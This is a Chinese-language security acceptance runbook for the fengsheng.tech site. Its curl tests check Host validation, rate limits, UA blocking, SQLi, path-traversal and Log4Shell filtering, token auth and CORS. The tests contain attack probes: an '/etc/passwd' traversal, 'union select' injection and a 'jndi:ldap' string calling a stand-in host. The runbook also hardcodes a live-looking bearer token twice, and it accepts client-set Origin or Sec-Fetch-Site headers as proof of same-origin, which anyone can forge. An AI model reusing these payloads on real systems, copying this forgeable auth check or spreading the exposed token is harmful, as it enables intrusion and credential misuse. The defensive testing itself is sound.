# 风声站端技术链路 v1.0 · 复跑手册

> 小扣子（技术 Owner）· 2026-11-21 · **每次安全/运维变更后必须跑完**
> 目标：给任何接岗人/审计者一套可复跑、可审计的验收命令，覆盖 8 层防御 + 基线快照
> 前置：`API_BEARER_TOKEN` 环境变量已配（本地 `export API_BEARER_TOKEN=xxx` / GitHub Actions Secrets）

---

## 零、基线工具一键跑完（推荐先跑这个）

```bash
# 三类快照 + 滚动对比 + 全站巡检，15 秒出 JSON
API_BEARER_TOKEN=0c639ffdaf26b1d04857ac14f2e9edbe9e3087b55da3c741 \
python3 scripts/daily_check.py --json
```

**验收口径**：
- 三类快照全绿（A 安全头 5/5 / B schema+条数 / C 三端点 P50+D1 读数）
- `🔶 基线异常: 0`（首次跑会建立基线，后续跑会自动对比）
- `🔴 页面严重: 0`
- 退出码：`0` = 全部正常，`1` = 有 WARN 或基线差异，`2` = 有 CRIT

---

## 一、Layer 0.6 · Host Header 校验（防 DNS 重绑定）

```bash
# PASS：合法 Host 通过
curl -sI https://fengsheng.tech/ -H 'Host: fengsheng.tech' | grep -E 'HTTP|server'
# 期望：HTTP/2 200 + server: cloudflare

# PASS（预期拦截）：伪造 Host 被拒
curl -sI https://fengsheng.tech/ -H 'Host: evil.example.com' | grep -E 'HTTP'
# 期望：HTTP/2 403 或 503
```

## 二、Layer 1 · IP Ban（黑名单 IP 直接 403）

```bash
# 验证逻辑：不在黑名单的 IP 正常访问（无法主动测试黑名单，因为需要先被触发 Layer 2 限流或 Layer 5 探测才会上黑名单）
# 运维查询：Cloudflare Dashboard → Security → WAF → Tools → IP Access Rules
# Worker 日志 grep "BANNED" 可查当前被封禁的 IP
```

## 三、Layer 2 · 全局限流（30 次/分钟/IP）

```bash
# 快速打 35 次，观察后几个的状态码
for i in $(seq 1 35); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://fengsheng.tech/api/health?_=$i")
  echo "$i: $code"
done | tail -10

# 期望：前 30 个 200，后 5 个 429 或 503
# 注意：本地 sandbox 走代理可能有差异，建议在本地网络跑
```

## 四、Layer 3+4 · UA 黑名单 + AI 爬虫拦截

```bash
# sqlmap UA → 应 403/404
curl -sI -H 'User-Agent: sqlmap/1.5' https://fengsheng.tech/api/health | grep -E 'HTTP|server'

# nmap UA → 应 403/404
curl -sI -H 'User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine)' \
  https://fengsheng.tech/api/health | grep -E 'HTTP|server'

# 正常浏览器 UA → 200
curl -sI -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36' \
  https://fengsheng.tech/api/health | grep -E 'HTTP|server'
```

## 五、Layer 5+6 · 利用路径检测 + Honeypot

```bash
# 常见注入路径 → 应 403
curl -sI 'https://fengsheng.tech/?../../etc/passwd' | grep -E 'HTTP'
curl -sI 'https://fengsheng.tech/?q=..%2F..%2Fetc%2Fpasswd' | grep -E 'HTTP'
```

## 六、Layer 7+7.5 · SQLi/XSS/Log4Shell 检测（Query + Body）

```bash
# Query string 注入 → 应 403
curl -sI "https://fengsheng.tech/api/search?q=' union select 1,2,3--" | grep -E 'HTTP'

# POST body 注入 → 应 403（Layer 7.6 新增：只对 events 端点生效）
curl -sI -X POST -H 'Content-Type: application/json' \
  -d '{"type":"test","product":"web","page":"a union select 1,2,3--","uid":"anon123"}' \
  https://fengsheng.tech/api/events | grep -E 'HTTP'

# Log4Shell 探测 → 应 403
curl -sI 'https://fengsheng.tech/?x=${jndi:ldap://evil.com/x}' | grep -E 'HTTP'
```

## 七、Layer 8 · Bearer Token API 鉴权（P0 核心）

```bash
TOKEN="0c639ffdaf26b1d04857ac14f2e9edbe9e3087b55da3c741"

# ① 同源浏览器 → 自动放行（前端页面 fetch 无感）
curl -s -H 'Origin: https://fengsheng.tech' -H 'Sec-Fetch-Site: same-origin' \
  "https://fengsheng.tech/api/entries?domain=签约前&limit=1" | python3 -c "import sys,json; d=json.load(sys.stdin); print('✓ 同源放行 OK, total=', d.get('total'))"

# ② Bearer Token → 放行
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://fengsheng.tech/api/entries?domain=签约前&limit=1" | python3 -c "import sys,json; d=json.load(sys.stdin); print('✓ Token 放行 OK, total=', d.get('total'))"

# ③ 无 Origin 无 Token → 401（curl/脚本直连 = 焊死）
curl -s -o /dev/null -w "%{http_code}" \
  "https://fengsheng.tech/api/entries?domain=签约前&limit=1" && echo " （期望 401）"

# ④ PUBLIC 端点不受影响（应仍 200）
for ep in /api/health /api/stats/health /api/heartbeat /api/feedback; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://fengsheng.tech$ep")
  echo "  $ep → $code（期望 200）"
done
```

## 八、口令锁（PROTECTED_PAGES）+ CORS 收敛

```bash
# 8 个受保护页无 Cookie → 应 302→/gate
for p in /dashboard/ /agent-assessment/ /management/ /okr/ /standard/ /quality-test/ /s1-report/ /survey/; do
  loc=$(curl -sI "https://fengsheng.tech$p" | grep -i 'location:' | head -1 | awk '{print $2}')
  echo "  $p → $loc"
done
# 期望每个都指向 https://fengsheng.tech/gate?next=...

# 外站 Origin → CORS 只回本站域
curl -sI -H 'Origin: https://evil.example.com' \
  'https://fengsheng.tech/api/health' | grep -i 'access-control-allow-origin'
# 期望：不出现 evil.example.com，应该是 https://fengsheng.tech 或不回显
```

---

## 附录 A · 基线快照三类指标（`scripts/daily_check.py` 采集项）

| 类 | 指标 | 防什么漂移 | 判定 |
|---|---|---|---|
| **A·安全头** | `/api/health` `/api/stats/health` `/api/heartbeat` 各 5 头齐全 | Worker 改代码时不小心丢 `applySecurityHeaders()` | 5/5 全齐 |
| **A·Layer 8 行为** | 无 Token → 401（entries + stats） | AUTH_REQUIRED 列表被误删 | 两个端点都 401 |
| **B·Schema** | `/api/entries?domain=签约前&limit=1` 的字段名 sorted + total | 改 entries 表结构没通知下游 | 字段集合 = 基线快照，total 在 ±5% 内 |
| **C·性能** | 三端点 P50 + `x-d1-budget-used` | Worker 变慢 / D1 查询退化 | P50 不超基线的 2 倍 |

## 附录 B · 受保护页清单（PROTECTED_PAGES Set）

```
/dashboard, /dashboard/
/agent-assessment, /agent-assessment/
/management, /management/
/okr, /okr/
/standard, /standard/
/quality-test, /quality-test/
/s1-report, /s1-report/      ← 2026-11-21 R3 补
/survey, /survey/            ← 2026-11-21 R3 补
```

## 附录 C · AUTH_REQUIRED vs PUBLIC 边界（2026-11-21）

| 类型 | 路径前缀 | 放行条件 |
|---|---|---|
| **AUTH_REQUIRED** | `/api/events` `/api/event` `/api/entries` `/api/entry` `/api/search` `/api/knowledge-stats` `/api/scene` `/api/dictionary` `/api/stats` `/api/mp-stats` `/api/chats` `/api/internal-gate` `/api/admin/agents` | 同源浏览器 **OR** Bearer Token |
| **PUBLIC**（Set.has 精确匹配） | `/api/health` `/api/heartbeat` `/api/stats/health` `/api/ai-advisor/health` `/api/feedback` `/api/partner-intent` `/api/lead` `/api/feishu/event` `/api/chat` `/mentor-api/chat` `/api/ai-advisor` `/api/auth/wx-login` `/api/wx-login` `/api/wxacode` `/api/decode` `/api/assess` `/api/callback` `/api/daily` `/api/quality-check` `/api/rating` `/api/experience` `/api/verify` `/api/ip-design` `/mentor-api/payment` | 永远放行（有 WAF+限流+IP ban 其他层保护） |

## 附录 D · Layer 8 三层放行逻辑（`checkApiAuth`）

```
请求进来 → path 在 AUTH_REQUIRED_API_PREFIXES 里？
  ├─ 否 → 直接放行
  └─ 是 → 检查
      ├─ isSameOriginBrowser(request) → true → 放行（前端页面 fetch 无感）
      ├─ Authorization: Bearer $env.API_BEARER_TOKEN 精确匹配 → 放行（脚本/运维工具）
      └─ 都不是 → 401
```

**isSameOriginBrowser 判定**（任一成立即真）：
- `Origin` header === `https://fengsheng.tech`
- `Sec-Fetch-Site` header === `same-origin` 或 `same-site`
- 请求来源 IP 在 Cloudflare Worker isolate 内（内部调用）

## 附录 E · 回滚预案

| 场景 | 回滚命令 | 说明 |
|---|---|---|
| Layer 8 上线后小程序/前端异常 | 临时在 Cloudflare Dashboard 把 API_BEARER_TOKEN Secret 清空 → Layer 8 Token 校验永远失败 → 只剩同源放行 | 不删代码，只空 Secret |
| PROTECTED_PAGES 误锁公开页 | Worker 控制台 `const PROTECTED_PAGES = new Set([...])` 里删掉误锁的 path，commit push | — |
| Worker 整体退化 | `git log --oneline -- _worker.js` 找到前一个稳定 commit → `git revert <bad-commit>` | 不 force push，保留历史 |
